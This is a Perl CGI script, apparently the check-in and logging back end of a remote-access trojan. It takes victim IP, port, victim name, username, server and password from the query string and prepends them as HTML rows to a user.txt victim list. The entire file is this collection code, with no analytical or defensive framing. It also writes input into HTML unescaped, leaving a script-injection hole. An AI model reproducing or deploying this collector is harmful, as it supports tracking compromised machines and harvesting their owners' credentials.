#!/usr/bin/perl
print "Content-type:text/html\n\n";

#################################################################
#                                                               #
#################################################################

$in = $ENV{'QUERY_STRING'};
@in = split(/[&;]/,$in); 
foreach $i (0 .. $#in) {	
  $in[$i] =~ s/\+/ /g;	
  ($key, $val) = split(/=/,$in[$i],2);	
  $key =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $val =~ s/%([A-Fa-f0-9]{2})/pack("c",hex($1))/ge;	
  $in{$key} .= "\0" if (defined($in{$key}));	 
  $in{$key} .= $val;
}
  $bestand='user.txt';
  $action = $in{'action'};
  $ip = $in{'ip'};
  $port = $in{'port'};
  $vicname = $in{'vicname'};
  $usrname = $in{'usrname'};
  $server = $in{'server'};
  $password = $in{'password'};

 @days   = ('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
 ($sec,$min,$hour,$mday,$mon,$year,$wday) = (localtime(time))[0,1,2,3,4,5,6];
 $time = sprintf("%02d:%02d:%02d",$hour,$min,$sec);
 $date = "$days[$wday] $mday, $time";

if ($password eq "")
{
 $password = '-';
}

if($action eq "log")
{

open (FILE,"+<$bestand"); 
@list = <FILE>;
close(FILE);

while ($#list >= 149) { 
pop @list; 
} 

open (FILE,"+<$bestand");  
#print FILE "<tr><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$ip."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$port."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$vicname."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$usrname."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$server."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$date."</td><td><font color=#CCCCCC style=font-size:11 face=Verdana>".$password."</td>\n"; 
print FILE "<tr><font color=#CCCCCC style=font-size:11 face=Verdana><td>".$ip."</td><td>".$port."</td><td>".$vicname."</td><td>".$usrname."</td><td>".$server."</td><td>".$date."</td><td>".$password."</td></font>\n"; 
print FILE (@list);
close(FILE);
}


